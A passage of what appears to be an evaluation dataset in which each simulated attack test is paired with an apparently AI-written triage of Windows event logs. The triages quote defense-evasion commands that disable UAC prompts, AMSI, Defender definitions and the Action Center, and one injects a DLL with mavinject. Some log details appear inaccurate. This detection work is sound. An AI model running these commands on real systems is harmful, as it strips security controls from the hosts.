This analysis prioritizes the immediate concern of system defenses being disabled, indicating that further security measures and investigations are warranted."
UEFI Persistence via Wpbbin.exe File Creation,"Upon reviewing the Windows event logs, here are my observations and analysis:

**1. Process Execution Analysis:**
   - **PowerShell Execution:**
     - A PowerShell command was executed with the intention to create a file named `wpbbin.exe` in the `C:\Windows\System32` directory. The command line is: `powershell.exe & {echo \""Creating %%systemroot%%\\wpbbin.exe\"" , New-Item -ItemType File -Path \""$env:SystemRoot\\System32\\wpbbin.exe\""}`.
     - Creating an executable in the `System32` directory can be viewed as a sign of potential malicious behavior because this directory is typically restricted to system processes or trusted applications.
   - **Use of Built-in Utilities:**
     - Utilities like `hostname.exe`, `whoami.exe`, `conhost.exe`, and `wevtutil.exe` were executed. Using these utilities alone isn't necessarily suspicious, but it can indicate reconnaissance or logging changes if used in a compromised context.

**2. Event Time Manipulation:**
   - Several events suggest the system time was altered:
     - Specifically, a `Microsoft-Windows-Security-Auditing` event (ID 4616) logs changes in time from `2024-10-27 12:41:44.3838027` to `2024-10-27 12:41:37.6118793`, which could indicate an attempt to manipulate timestamp evidence.

**3. Security and Privilege Escalation:**
   - There is a successful logon entry for the user `admin_test` with high privileges (`SeSecurityPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, `SeDebugPrivilege`, etc.) in event ID 4672.
   - High privilege and the manipulation of the system time could indicate preparation for further malicious activities.

**Assessment:**
- **Suspicious Activity Indicators:**
  - The use of PowerShell to create an executable in the `System32` folder.
  - Alteration of system time, which could bypass security logs.
  - High privileges assigned to the `admin_test` user, indicating potential unauthorized access or privilege escalation.

**Guidance:**
- Conduct a thorough forensic analysis of the `wpbbin.exe` file—if it exists—to determine its origin and purpose.
- Investigate user `admin_test`'s activities and identities.
- Review system access and authentication logs for potential unauthorized access.
- Verify any legitimate purpose for the system time change.
- Implement additional monitoring for similar activities on the network.

**Resolution:** SUSPICIOUS - The observed activities suggest potentially malicious intent, warranting further investigation to confirm or rule out compromise."
DLL Search Order Hijacking - amsi.dll,"Upon reviewing the provided logs, several indicators point to potentially suspicious activity, particularly in the Windows PowerShell and Sysmon logs. Let's break these findings down:

1. **PowerShell Log Analysis**:
    - The PowerShell logs indicate that an executable named `updater.exe` was executed with the command `-Command exit`. Such behavior raises concern, especially since the executable resides in `AppData\Roaming`, which is unusual for executables. This could indicate an attempt to disguise a malicious script as a legitimate updater.
    - Additionally, there is a series of PowerShell providers (e.g., Registry, Alias, Environment, etc.) being started in sequence. While these initializations are not inherently malicious, combined with the suspicious location and name of the executable, they warrant further investigation.

2. **Security Log Analysis**:
    - The security logs show a series of small time changes and process actions by `svchost.exe` under the `LOCAL SERVICE` account, which is a normal action and doesn't seem immediately suspicious without other correlating logs indicating misuse.

3. **Application Log Analysis**:
    - Logs related to Microsoft Edge updates seem benign. Regular update services such as `edgeupdate` stopping and starting are common and generally not of concern unless correlated with other suspicious behavior.

4. **Sysmon Log Analysis**:
    - The Sysmon logs reveal more suspicious activities. The command associated with `cmd.exe` being executed under `admin_test` with the task of copying `powershell.exe` to `updater.exe` and `amsi.dll` to another location suggests an attempt to evade detection by security tools (such as Anti-Malware Scan Interface (AMSI) bypass techniques often associated with malware).
    - These actions, especially the creation and execution of `updater.exe` and renaming essential security files, are very suspicious.
    - Multiple executions of system utility programs like `whoami.exe` and `wevtutil.exe` under the context of `admin_test` could indicate attempts to escalate privileges or clear event logs, common tactics utilized by malicious actors.
    - The presence of high integrity levels for these processes further suggests potential privilege misuse.

**Assessment and Resolution**:
Based on the logs and their analysis, there is substantial evidence to suggest that malicious activities are occurring on the investigated host. The creation and execution of `updater.exe` in `AppData\Roaming`, combined with script evasion tactics, point to likely malicious intent.

**Resolution: MALICIOUS** - Given the evidence, the activity logged is indicative of a probable type of attack, possibly involving script-based malware evasion tactics. 

**Guidance**:
- It is crucial to contain and further analyze the `updater.exe` executable, determining its origin, behavior, and intent.
- Deep-dive into the `admin_test` account activity for any unwarranted changes or privilege escalations.
- Consider conducting a thorough system and network investigation to ensure no further malicious presence and eradicate any compromise that may have pushed this activity.
- Enhance endpoint security postures, including monitoring for abnormal script execution and especially PowerShell in user space locations such as AppData."
AMSI Bypass - Create AMSIEnable Reg Key,"Upon analyzing the provided Windows event logs, the following observations were made:

### 1. **PowerShell Log**
The PowerShell logs indicate activity to create and modify registry entries, specifically disabling AMSI (Anti-Malware Scan Interface) by setting the `AmsiEnable` registry value to `0`. This action can be indicative of an attempt to bypass AMSI, a common technique used by malware to evade detection by security software.

### 2. **Sysmon Log**
The Sysmon logs reveal a series of process creations and executions, which are mostly normal activities such as the execution of Microsoft Edge Update processes and standard Windows utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe`. However, the presence of the specific PowerShell command to disable AMSI is also logged here, further corroborating the suspicious activity indicated by the PowerShell logs.

### 3. **Application Log**
No distinct or immediate threats are identified in the application logs. They mostly note service operations related to Edge updates.

### 4. **Security and System Logs**
These logs primarily show typical system activities related to time synchronization and service operations. No immediate threats or anomalies linked to privilege escalation or unauthorized access are discernible.

### **Assessment and Conclusion**
- **Suspicious Activity**: The critical finding is the PowerShell command that disables AMSI. Disabling AMSI is a suspicious action often associated with attempts to execute unauthorized scripts without interference from security applications. No legitimate administrative task should reasonably justify this action, particularly in a server environment.
- **Benign Operations**: Aside from the above, most other logged operations appear benign and typical of system and application behavior in a Windows environment.

Given the suspicious PowerShell activity, the logs should be categorized as **SUSPICIOUS**. This highlights the need for further investigation to ensure that no unauthorized activities or compromises have occurred, especially focusing on any potential script executions that may follow the AMSI disabling action.

### **Guidance**
- **Immediate Action**: Reverse any unauthorized registry changes, especially those disabling AMSI.
- **Further Investigation**: Conduct a thorough review of system file integrity, scan for malware, and inspect any scripts executed around the time of the PowerShell activity.
- **Monitoring and Hardening**: Enhance monitoring of PowerShell activities and consider implementing stricter controls surrounding script execution policies and registry changes on critical servers like Server002. Additionally, educating users on the implications of such actions could prevent future occurrences."
UACME Bypass Method 33,"**Detailed Analysis:**

1. **Application Log Analysis:**
   - The application log primarily consists of logs related to Microsoft services (e.g., Edge Update, Windows Defender). Notably, the ""edgeupdate"" service logs the event ""Service stopped."" Such events typically indicate routine behavior as part of service stop and start cycles; nothing indicates malicious activity.
   - Windows Defender logs consistently show ""SECURITY_PRODUCT_STATE_ON,"" indicating that it was functioning normally during this period.

2. **Security Log Analysis:**
   - Event ID 4624 indicates successful logon events. These primarily involve the NT AUTHORITY\SYSTEM account, which is expected on a server environment for system-level operations.
   - Event ID 4672 shows Special Privileges assigned to SYSTEM—these privileges include SeDebugPrivilege, SeTakeOwnershipPrivilege, among others, which are normal for the SYSTEM account’s operational requirements.
   - Event ID 5379 repeatedly attempts to interact with Microsoft account tokens, but these fail with the return code indicating an access issue. Although frequent, this could be associated with service activities attempting synchronization or token validation and not necessarily indicative of a breach.

3. **Sysmon Log Analysis:**
   - Numerous instances of cmd.exe, conhost.exe, and Microsoft Edge Update processes running with SYSTEM or admin_test privileges. Cmd.exe and Powershell command lines appear typical for system processes and higher privilege scenarios in some context.
   - Key suspicious entry: Execution of ""33 Akagi64.exe"" logged via a command executed from cmd.exe. This filename could be an executable that isn't standard, potentially indicating unauthorized software. This warrants further investigation.
   - Multiple instances of Edge Update executable (e.g., MicrosoftEdgeUpdate.exe) with different command-line arguments such as ""/svc"", ""/ping"", ""/update"", which are consistent for automatic update checks or installations by the Edge browser's update service.

**Assessment and Recommendation:**

- **Assessment:** The predominant activities described within the logs appear routine and align with the standard operation of Windows services and Microsoft applications such as Edge. However, the appearance of ""Akagi64.exe"" through cmd execution could suggest potentially unauthorized or malware activity, although without further context (like an actual hash lookup), it can't be definitively labeled as malicious from logs alone.

- **Recommendation:** Given the Akagi64.exe's presence, several actions are warranted:
  1. **Investigate the origin and legitimacy** of ""Akagi64.exe"" - Check for this file’s presence, modification dates, location, verify against known malware signatures, and take appropriate action if deemed malicious.
  2. **Monitor and Audit further activities** from the user account “admin_test” and any process executions to determine if any unauthorized actions were executed.
  3. **Review security settings** and update defenses to prevent unauthorized administrative commands or potentially unwanted applications from executing in the future.

**Resolution:** **SUSPICIOUS** - While most activities seem benign and routine, the presence of ""Akagi64.exe"" execution is anomalous enough to merit further investigation."
Disable Windows Security Center Notifications,"Upon reviewing the provided Windows event logs, the following analysis can be derived:

1. **Usage of Administrative Utilities**:
   - Frequent execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\\admin_test`.
   - The `wevtutil` command-line utility is used to retrieve and manage event logs. Its presence in the logs multiple times might suggest someone is monitoring or modifying event logs, which could be an attempt to cover tracks, but given the `admin_test` context, this might just be administrative tasks.
   - `conhost.exe` is a legitimate Windows process linked to running Command Prompt in the graphical user interface.

2. **Execution of Command-line Utilities**:
   - The logs show the execution of `cmd.exe` with a command-line for adding a registry key: 
     ```
     ""cmd.exe"" /c reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f
     ```
      - Editing registry keys, especially under `HKLM` (HKEY_LOCAL_MACHINE), is a privilege that could potentially alter system behavior and should be monitored. This could be benign if part of a system configuration script by an administrator but can also indicate an attempt to alter system settings for persistence or evasion.
   - Execution of `whoami.exe` and `hostname.exe` are typically used for environment reconnaissance.

3. **Credentialed Access and Privileges**:
   - Security Event Log shows user `admin_test` logged on using NTLM authentication, with elevated privileges, which include sensitive permissions like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others, indicating high-level access. However, these could be standard privileges for an administrative account.
   - The elevated token and the privilege list suggest the user has high privileges which could be misused if not supposed to belong to an unknown entity.

4. **Compliant Observations**:
   - `TiWorker.exe` and `TrustedInstaller.exe` processes are part of Windows Update components running under `NT AUTHORITY\SYSTEM`. The presence of these processes is typical during maintenance activities.
   - `sppsvc.exe` relates to licensing services, and its execution doesn't appear anomalous.

5. **Indicators of Anomalous/Malicious Activity**:
   - The use of `cmd.exe` for registry editing stands out the most. While it could be legitimate, such operations can also be indicative of attempts to modify system behavior.

**Assessment**:
- The logs show a concentrated burst of activity involving utility execution and registry manipulation, predominantly executed by a user with administrative privileges. This might go unnoticed in regular administrative maintenance but warrants further investigation due to the potentially sensitive nature of registry modifications and the consistent use of high privileges (`SeDebugPrivilege`).

**Resolution**: **SUSPICIOUS**  
The activities, while potentially benign, notably the registry edits and high privilege usage, merit further investigation to rule out or confirm malicious intent. A security analyst should verify whether these actions align with routine administrative tasks or if they could be indicative of compromise or malicious behavior.

**Guidance**:
- Cross-reference registry changes with any recent administrative maintenance tasks or scripts to confirm legitimacy.
- Check system access logs and user activity history around this timeframe for further context.
- Consider monitoring the user account `admin_test` for additional anomalous behavior.
- Verify the intent and origin of the high-privilege access and executed commands, if not part of standard practice."
Remove Windows Defender Definition Files,"Based on the analysis of the provided Windows event logs, below is the detailed assessment:

### Application Log:
- **Event 15 (SecurityCenter)**: This series of events indicates that Windows Defender is in an ""ON"" state. There is nothing unusual about these entries as they merely show that Windows Defender is operational.

### Sysmon Log:
- **Process Execution Events (Event ID: 5)**:
  - `wevtutil.exe` and `conhost.exe` are executed multiple times. While these are legitimate Windows utilities (Event Viewer utility and Console Window Host, respectively), repeated and frequent execution in quick succession can sometimes indicate an attempt to manipulate or query event logs unauthorizedly.
  - `wevtutil.exe` being executed is by itself not suspicious if done by an authorized administrator for log handling purposes. However, if the user (`SERVER002\\admin_test`) did not initiate this activity, it might warrant further investigation.

- **Process Execution (Event ID: 1)**:
  - `cmd.exe` is executed with a command targeting Windows Defender’s command line utility `MpCmdRun.exe` with the `-RemoveDefinitions -All` parameter. This command is suspicious because it attempts to remove malware definitions from Windows Defender, which could be an attempt to disable or weaken the system's security setup.
  - Other common utilities like `hostname.exe` and `whoami.exe` are executed with high integrity, indicating actions are being performed with elevated privileges. Again, while benign in controlled environments, they should be verified as legitimate according to usage policies.

### System Log:
- **Kernel-General Event (Event ID: 16)**:
  - An entry for the `\\??\\C:\\Windows\\system32\\config\\ELAM` hive shows only minimal update, typical for boot-start drivers or anti-malware initialization.

### Overall Assessment:
The execution of commands to weaken Windows Defender is highly suspicious, especially concerning the `cmd.exe` command to remove definitions. This action is atypical unless performed for a test in a controlled environment, validated by IT or security protocols. Repeated usage of `wevtutil.exe` could suggest potential log tampering efforts unless confirmed legitimate by log management activities.

### Resolution: SUSPICIOUS
The logs indicate suspicious activity that merits further investigation. Specifically, efforts to disable or manipulate security settings (e.g., Windows Defender) should prompt verification of user intentions (`SERVER002\\admin_test`) and examination of broader user activity or context during this timeframe.

### Guidance for Proceeding:
1. **Validate User Activity**: Contact the user or administrative group (`admin_test`) to verify if these commands were intentionally executed for maintenance or testing purposes.
2. **Check for Policy Adherence**: Ensure these actions align with company policies and practices.
3. **Review System Security Configuration**: Check for unauthorized alterations to security configurations.
4. **Examine Anomalous Patterns**: Investigate any other indicators of potential compromise or malicious intent, such as unauthorized remote access or file alterations.
5. **Monitor Future Logs Closely**: Enhanced auditing on this host's activities for any further suspicious behaviors.

By following these steps, we can ensure the integrity of the system and address any potential security gaps promptly."
Install root CA on Windows with certutil,"Based on the analysis of the provided Windows event logs, several points of interest suggest potential suspicious activities that warrant further investigation:

1. **PowerShell Execution with certutil**: 
   - There is a PowerShell command `certutil -addstore my $env:Temp\\rootCA2.cer` executed, which is suspicious. PowerShell combined with certutil is often used in malicious activities, such as downloading or installing unauthorized certificates or files.
   - Certutil is commonly used by attackers for downloading files or adding certificates to the trust store, which could be part of a man-in-the-middle attack or other forms of credential compromise.

2. **Use of wevtutil**:
   - The `wevtutil.exe` utility, observed multiple times in Sysmon logs, is used for managing Windows event logs. While not inherently malicious, frequent use might indicate log tampering or attempts to clear logs to hide activities.

3. **High Integrity Level Process Executions**:
   - Multiple instances of processes running with high integrity levels suggest privileged actions. This could be legitimate system or administrative tasks, but in context with other potentially suspicious factors, it warrants caution.

4. **Multiple Edge Updates and Com Registrations**:
   - Numerous executions of `MicrosoftEdgeUpdate.exe` and related COM registration helpers could be part of legitimate software updates, but the frequency and context should be cross-referenced with expected patching schedules.
   - Additionally, activities associated with temporary directory usage for updates might signify tampered installations or updates.

5. **Administrative Logins and Privileges**:
   - The security log registers several privileged logins and use of high-level privileges, including debugging and driver loading. While these may be within the bounds of normal operations, in conjunction with the PowerShell and certutil use, they should be reviewed.

**Resolution**: **SUSPICIOUS**

The logs contain activities that deviate from normal operation patterns, involving PowerShell and certutil usage, wevtutil frequent executions, and administrative activities. These combined factors could indicate potential malicious behaviors. Further, detailed investigation and correlation with known update schedules, user activity verification, and cross-referencing with threat intelligence databases are recommended. It is crucial to ensure that these commands align with legitimate administrative tasks. As a precaution, consider increasing monitoring on the affected systems and users, and particularly audit changes made to the certificate store and event logs."
Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key,"Upon reviewing the provided Windows event logs, here's the detailed analysis:

1. **System Logs:**
   - Most entries relate to time synchronization events (Event ID 4616), which are standard operations and involve time adjustments using the Windows Time Service. There are no unusual process executions or command-line arguments in these entries. These logs appear normal and typically occur when the system time is adjusted or synchronized.

2. **Security Logs:**
   - The security logs also involve time change events (Event ID 4616) triggered by the `svchost.exe` process, which is a legitimate service host process and is commonly involved in system operations like time changes. No indications of privilege escalation or user account anomalies are present.

3. **Windows PowerShell Logs:**
   - The PowerShell logs reveal the execution of a script or command that attempts to change the `ConsentPromptBehaviorAdmin` registry setting to a value of `0`. This effectively disables the User Account Control (UAC) prompt for administrators, which can be a red flag, indicating potential privilege escalation or attempted persistence by a malicious actor.

4. **Sysmon Logs:**
   - In the Sysmon logs, several standard Microsoft Windows and application processes are logged. Some processes, like `wevtutil.exe`, are related to the Windows Event Log management, and `conhost.exe`, servicing console interactions, appear numerous times, which is typical of normal system operations. 
   - The common execution of `whoami.exe` could be routine, but frequent checks on user identity could also denote reconnaissance if observed with other suspicious activities. 
   - Notably, changes in registry settings through PowerShell and concurrent execution of legitimate processes are coupled with administrative privileges. The registry manipulation through PowerShell, described above, raises concerns.

**Assessment:**
- The most significant potentially malicious activity is the manipulation of UAC settings via PowerShell. This action can severely affect system security by allowing unauthorized privilege escalation.
- While the other logs show mostly benign system operations, the registry change action stands out as indicative of suspicious activity.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- **Immediate Actions:**
  - Investigate who executed the PowerShell command to alter the UAC settings by reviewing user account access logs and profiles.
  - Check for other signs of unauthorized access or configuration changes during the same period.
- **Further Investigation:**
  - Audit the system for any additional unauthorized registry changes or suspicious behavior post this incident.
  - Analyze network logs for outbound connections that may indicate data exfiltration or command and control callbacks.
- **System Security Measures:**
  - Reinstate the UAC settings to their default and monitor subsequent changes.
  - Strengthen detection and monitoring capabilities, especially around PowerShell usage and administrative activities.
  - Educate users on recognizing phishing or social engineering attempts often used to gain such access."
Modify Registry of Current User Profile - cmd,"After analyzing the provided Windows event logs, here is a detailed assessment:

### 1. **Analysis of Logged Events:**

- **Security Log:**
  - Several EventID 4616, indicating system time changes. These were conducted by the `svchost.exe` process running under the `LOCAL SERVICE` account. This could be indicative of time synchronization activities, which can sometimes be routine but should still be scrutinized in case of unexpected frequency or timing anomalies.

- **Sysmon Log:**
  - Multiple instances of process creation (EventID 1) involving legitimate Windows tools such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`.
  - Invocations of `cmd.exe` and `reg.exe` to modify the registry (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v HideFileExt`). This could be an attempt to hide file extensions, which is often done to obfuscate malicious activities or payloads. This particular command-line operation is a red flag for potential persistence mechanisms or evasion tactics commonly employed by malware.

- **System Log:**
  - Multiple Kernel-General and Time-Service events showing system time adjustments and synchronization events through `time.windows.com`. These logs alone do not appear suspicious but should be correlated with other activities.

### 2. **Indicators of Malicious Activity:**

- The modification of the Windows registry settings regarding file visibility using command-line tools like `cmd.exe` and `reg.exe` suggests suspicious activity. While this operation may be performed during system administration or maintenance, it is not typically part of routine processes and can denote malicious intent, as it allows files to be hidden from view.
  
- The consistent use of legitimate Windows binaries in a short time frame could also indicate a ""Living off the Land"" (LoL) scenario, where attackers leverage built-in Windows tools to bypass security measures and escalate privileges.

### 3. **Assessment and Resolution:**

Based on the behavioral analysis:

- The registry modification through command-line utilities to hide file extensions suggests anomalous activity that could potentially be part of a broader malicious campaign. Given that such registry changes can have legitimate purposes in restricted contexts, further investigation is warranted to confirm intent.

- The predominant use of legitimate tools for otherwise potentially malicious actions suggests an attempt to avoid detection.

**Resolution: SUSPICIOUS**

### 4. **Guidance on How to Proceed:**

- **Further Investigation:** Examine additional logs from around the same timeframe to see if there are any other correlating activities or network connections that could indicate data exfiltration or lateral movement.

- **Forensic Analysis:** Consider conducting a more in-depth forensic analysis on the `Server002` host, focusing on the accounts used and any files or scripts triggered around the times of these logs.

- **Network Monitoring:** Deploy heightened network monitoring to detect any outbound connections from `Server002`, particularly to unusual IP addresses.

- **Audit Registry Changes:** Implement a review to see if these registry changes align with any known system configuration baselines and check for any unauthorized changes.

By taking these actions, you can better determine the nature of the activity and whether it constitutes a real threat."
Renamed Microsoft.Workflow.Compiler.exe Payload Executions,"After analyzing the provided Windows event logs, the following observations and conclusions have been drawn:

### Security Log Analysis:
1. **Event ID 4624** - Successful Logon: The logon type 5 indicates a service logon, which is common for system processes and not inherently suspicious.
2. **Event ID 4672** - Special Privileges Assigned: Indicates that SYSTEM obtained several high-level privileges, which is typical as the SYSTEM account inherently possesses these rights.
3. **Event ID 5379** - Credential Validation Attempt: Multiple events with return code `3221225567` (STATUS_NO_SUCH_LOGON_SESSION) suggest failed credential validation attempts. User 'admin_test' tried accessing Windows Live tokens with no credentials returned. This activity is unusual but not definitively malicious without further context.

### Windows PowerShell Log Analysis:
The PowerShell logs exhibit execution of a script that calls an executable located in a temporary folder:
- The presence of a file named `svchost.exe` outside its typical directory (`C:\Windows\System32\`). Its execution through PowerShell suggests potential malicious activity, notably if it's masquerading as a legitimate system process.

### Sysmon Log Analysis:
- **Process Creation Events**: Several instances of process creation events show PowerShell and alternative paths being used for executing potentially suspicious files.
- **Event ID 1** and **5**: Instances of the same `svchost.exe` residing in a temporary folder reflect that this might not be a legitimate Windows process and should be investigated further.

### Application Log Analysis:
1. **.NET Runtime Errors**: The log provides information about the file `svchost.exe` in a temporary directory causing unhandled exceptions, specifically a `DirectoryNotFoundException`. This indicates that the program might be referencing paths that do not exist, which again suggests potential tampering or a misconfigured executable.

### Conclusion:
The logs contain multiple indicators that suggest potentially suspicious behavior:
- Execution of an executable named `svchost.exe` from a temporary directory is highly unusual and suspicious.
- The failed credential validation attempts could indicate unauthorized or testing efforts by a user or script.
- Multiple runtime errors associated with key system executables signal invalid operations.

Given these points, I would classify the activity as **SUSPICIOUS**. It warrants further investigation, particularly focusing on:
- Verifying the integrity of `svchost.exe` located in the temporary directory.
- Inspecting user 'admin_test' for unusual activity or anomalies with logon sessions.
- Checking network logs for any outbound connections corresponding with these events that might suggest potential data exfiltration attempts.

### Next Steps:
- Isolate the host and perform a thorough malware scan on the temporary directory and affected process trees.
- Review user credentials and audit logon sessions associated with 'admin_test' to ensure no unauthorized access.
- Analyze network logs for any indications of Command and Control servers or exfiltration attempts related to the suspicious activity."
Masquerading - non-windows exe running as windows exe,"After analyzing the provided logs, there are several points of interest that raise concerns about potential malicious activities:

1. **PowerShell Activity:**
   - The PowerShell logs indicate the execution of a script that copies `data.003.exe` to `svchost.exe`, executes it, and then stops the process. This behavior is a red flag because:
     - `Copying an executable to a well-known system process name (svchost.exe)` is a known technique used by attackers to disguise malware.
     - `Execution and immediate termination` of such a process without a clear legitimate reason can indicate attempts to evade detection.

2. **Security Events:**
   - Multiple events (ID 5379) show failed credential/operation attempts with specific return codes, which could indicate attempted access or interaction with online services via MicrosoftAccount credentials. Although return codes don’t indicate success, repeated attempts can be indicative of unauthorized access attempts or reconnaissance activities.

3. **Sysmon Logs:**
   - PowerShell execution with a suspicious command line as observed reinforces the finding of potential malicious behavior.
   - Creation of processes such as `wevtutil.exe`, `whoami.exe`, `conhost.exe` in quick succession could suggest enumeration or information-gathering scripts running.
   - Instances of `svchost.exe` and `dllhost.exe` running without clear parent commands or legitimate contexts can also be a concern if tied to suspicious activities.

4. **Update Logs:**
   - While these show standard update activities, they are overshadowed by potentially problematic behavior from other logs.

**Assessment:**
The logs contain indicators highly suggesting suspicious and potentially malicious activities. The usage pattern of PowerShell, in particular, indicates a high risk of compromise, possibly through a script that executed an unknown executable disguised as a legitimate process.

**Resolution:**
- **MALICIOUS**: The patterns and behaviors observed (specifically with PowerShell usage and process executions) lead to a high confidence assessment of malicious intent.

**Guidance:**
- Immediately isolate the affected host (Server002) to prevent further potential spread or damage.
- Conduct a comprehensive forensic analysis of `data.003.exe` and any resulting `svchost.exe` copies for malicious behaviors or payloads.
- Review system configurations and access permissions to fortify defenses and prevent similar unauthorized executions.
- Monitor network traffic to and from the host to identify any other compromised systems or data exfiltration attempts.
- Consider restoring the system from a known good backup after ensuring no persistent threats remain."
Modify UseTPM Registry entry,"Upon reviewing the provided Windows event logs, here's the detailed analysis:

### Observations:

1. **Edge Update Activity:**
   - Frequent references to `MicrosoftEdgeUpdate.exe` and associated processes in both Sysmon and Application logs.
   - The process `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` was executed with the `/update` parameter from a legitimate path.
   - The activity appears related to Edge update processes, which is a normal operation for keeping the browser updated.

2. **Usage of Built-in Windows Tools:**
   - Execution of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` by the user `SERVER002\admin_test`.
   - The `cmd.exe` process executed a command to modify registry keys related to BitLocker (`HKLM\SOFTWARE\Policies\Microsoft\FVE`).

3. **Registry Modification:**
   - The following command was executed: `cmd.exe /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPM /t REG_DWORD /d 2 /f`.
   - Altering registry keys, especially security-related ones like those for BitLocker, can indicate potential tampering.

4. **Execution Context and Integrity Levels:**
   - Processes associated with Edge updates were executed under `NT AUTHORITY\SYSTEM` with System Integrity Level, which is typical and expected for system updates.
   - Other processes executed by `SERVER002\admin_test` maintained a High Integrity Level.

5. **Frequency and Pattern:**
   - The events occurred within a minimal time frame, suggesting batch execution of processes, potentially scripted or automated.

### Conclusion:

- The logs predominantly show activity surrounding the Microsoft Edge update process, which is typically benign.
- However, the registry modification command with `cmd.exe` under a user context raises concerns about possible unauthorized policy changes or privilege misuse.

### Assessment:

- **SUSPICIOUS:** While Edge update processes are generally benign and expected, the specific registry modification command executed by `SERVER002\admin_test` warrants further investigation. This action could be part of a legitimate administrative task, but without additional context, it might represent a security risk related to BitLocker policy changes.

### Guidance:

1. **Investigate User Activity:**
   - Verify the legitimacy of `SERVER002\admin_test` user actions, specifically around the timestamp of the registry modification.
   - Cross-reference with other security logs (e.g., authentication logs) for anomalous behavior by this user.

2. **Validate Registry Changes:**
   - Confirm whether the registry modification aligns with standard IT policies or if it was executed without authorization.

3. **Monitor Further Activity:**
   - Continuously monitor for any additional unauthorized modifications or escalated commands by suspicious users.
   - Implement alerts for similar registry changes on sensitive configurations.

The investigation should focus on confirming whether the identified suspicious activity is legitimate or if it indicates a potential compromise."
Disable UAC - Switch to the secure desktop when prompting for elevation via registry key,"### Detailed Analysis

#### 1. **Windows PowerShell Logs:**
- **Event ID 600**: 
  - The critical observation here involves the `Set-ItemProperty` command executed via PowerShell. This command is modifying the Windows registry key `HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` and setting the `PromptOnSecureDesktop` value to `0`.
  - **Potential Issue**: This action disables the Secure Desktop mode for User Account Control (UAC) prompts, reducing the security of the system by allowing UAC prompts to appear on the regular desktop rather than a secure one. This kind of modification can be indicative of an attempt to lower system defenses to allow further malicious actions.
  - **Assessment**: This is suspicious as it might be related to a privilege escalation attempt or preparation for executing further unauthorized actions on the system.

#### 2. **Sysmon Logs:**
- **Frequent Execution of System Utilities**:
  - We observe multiple instances of system utilities such as `wevtutil.exe`, `conhost.exe`, and `wsmprovhost.exe` being executed in rapid succession before the PowerShell command.
  - The execution of `whoami.exe` could be indicative of attempts to gather user account information.
  - These could suggest scripting to automate some changes or checks on the system, potentially as part of a script to prepare the environment for malicious activity.
  
- **PowerShell Execution**:
  - There is an explicit entry for a PowerShell execution with the same command found in the PowerShell logs, confirming the utilization of a script or command sequence to modify security settings.

- **Edge Update Logs**:
  - The logs show frequent execution of Microsoft Edge Update related processes, which is consistent with normal activity, assuming updates or maintenance tasks are being conducted. No explicit issue here unless further correlated with external intelligence.
     
#### 3. **Other Logs:**
- **No significant alerts or events** were noted in the Security, System, and other Application logs that directly indicate further malicious actions beyond the already identified suspicious PowerShell execution and configuration changes.

### Assessment and Resolution

- **Suspicious Activity**: The modification of the `PromptOnSecureDesktop` to disable UAC secure desktop mode is a clear security concern. This type of action can be a prelude to further unauthorized or malicious activity on the host. Ensuring this setting is investigated as to whether it aligns with any authorized maintenance or administration task is crucial.

### Guidance on Proceeding
- **Immediate Actions**: 
  - Investigate the origin and intent of the PowerShell command execution. Who initiated it and why?
  - Review user activities for the `admin_test` account around the time of events for any unauthorized access or actions.
  - Reinstate the `PromptOnSecureDesktop` registry setting to its original state if no legitimate justification is found for its modification.
  - Verify if these activities correlate with any active maintenance or legitimate administrative tasks. If not, consider this a breach attempt.
  
- **Recommended Resolution**: **SUSPICIOUS**
  - The activity doesn't conclusively confirm malicious intent but shows signs of security settings alteration without visible authorization or context provided in the logs. Further investigation is necessary to determine whether the actions are linked to legitimate administration or represent a security compromise."
mavinject - Inject DLL into running process,"Upon reviewing the logs, I have identified a combination of benign and suspicious activities. Let’s go through the detailed analysis:

### Analysis:

1. **Application Log:**
   - No suspicious entries noted. The logs show software protection processes and Edge update service-related entries. The ""service stopped"" messages for the EdgeUpdate service could be typical behavior during update cycles.

2. **Sysmon Log:**
   - **Powershell and Conhost Activity:** 
     - There are entries indicating the execution of `powershell.exe` followed by `conhost.exe`. While these could be benign, powershell activities should always be assessed in-depth due to its ability to execute scripts that could potentially be harmful if misused.
   - **Hosting and Utility Execution:**
     - The execution of `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` signify administrative tasks or system information retrieval. However, the use of `cmd.exe` with `mavinject.exe` and the `/INJECTRUNNING` command is highly indicative of malicious behavior. This particular activity might be indicative of an attempt to inject a DLL into a running process which is a common technique used by malware.
   - **Edge Update Activity:**
     - Multiple executions of `MicrosoftEdgeUpdate` and related update components is noted. During a legitimate update, multiple entries and tasks are executed as part of the update process. However, operations through temporary directories (e.g. `C:\\Program Files (x86)\\Microsoft\\Temp\\EUC9ED.tmp`) warrant further scrutiny to rule out tampering or misuse.

### Indicators of Potential Malicious Activity:
- Most concerning is the `cmd.exe` being used with `mavinject.exe /INJECTRUNNING`, which aligns with patterns associated with code injection. This can be indicative of malware attempting to inject its payload into a legitimate process to avoid detection.
  
### Assessment:
- The `cmd.exe` entry with `mavinject.exe` is especially suspicious and is a strong indicator of malicious intent or compromise.

### Resolution:
Based on the analysis, the combination of a suspicious command line execution involving `mavinject.exe` and potentially exploitative processes suggests a severe risk of compromise.

**Resolution: MALICIOUS**

---

**Guidance:**
- **Immediate Steps:**
  - Conduct a thorough investigation on `Server002` focusing on the processes tied to the suspicious command execution.
  - Isolate the host from the network to prevent any further potential spread or data exfiltration.
  - Run comprehensive forensic analysis tools to capture memory and network activity for deeper investigation.
  - Scan for known vulnerabilities and verify all system services and startup items for signs of external modification.
  
- **Long-term Actions:**
  - Conduct endpoint security reviews and ensure all systems are using the latest protective measures against such attacks.
